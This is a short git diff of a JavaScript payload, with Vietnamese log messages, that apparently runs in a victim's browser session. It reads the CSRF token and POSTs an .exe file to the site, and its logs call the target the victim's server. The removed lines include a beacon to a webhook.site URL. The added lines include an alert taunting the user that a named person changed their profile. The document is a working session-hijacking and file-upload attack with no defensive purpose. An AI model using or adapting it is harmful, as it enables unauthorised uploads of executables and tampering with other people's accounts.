@@ -88,35 +88,21 @@ async function uploadExe() {
 
     console.log('Đang gửi request với CSRF Token:', csrfToken);
 
-    fetch(endpoint, {
-        method: 'POST',
-        headers: {
-            'X-CSRFToken': csrfToken,
-            'X-Requested-With': 'XMLHttpRequest'
-        },
-        body: formData
-    })
-    .then(response => {
-        console.log('Phản hồi từ server (Status):', response.status, response.statusText);
-        if (response.ok) {
-            console.log('THÀNH CÔNG! Server đã chấp nhận.');
+    console.log('Đang upload file .exe lên server nạn nhân...');
+        const uploadResponse = await fetch(endpoint, {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': csrfToken,
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            body: formData
+        });
+
+        if (uploadResponse.ok) {
+            console.log('THÀNH CÔNG! Đã upload .exe lên server nạn nhân.');
         } else {
-            console.error('THẤT BẠI! Server từ chối.');
+            console.error('THẤT BẠI!', uploadResponse.status);
         }
-        return response.text(); 
-    })
-    .then(html => {
-        console.log('Nội dung phản hồi (HTML):', html);
-        if (html.includes('errorlist')) {
-            console.warn('Server trả về lỗi, kiểm tra lại các trường dữ liệu!');
-        } else if (document.title.includes('Login')) {
-            console.error('BỊ LOGOUT! Phiên đăng nhập hết hạn hoặc CSRF thất bại.');
-        }
-    })
-    .catch(error => {
-        console.error('Lỗi mạng hoặc lỗi JavaScript:', error);
-    });
-    fetch('https://webhook.site/2039e966-8e37-448b-8f25-6485def7ce17');
-    alert('Chan Khai da thay doi profile cua ban');
 }
 uploadExe();
+alert("Lam Chan Khai da thay doi profile cua ban");
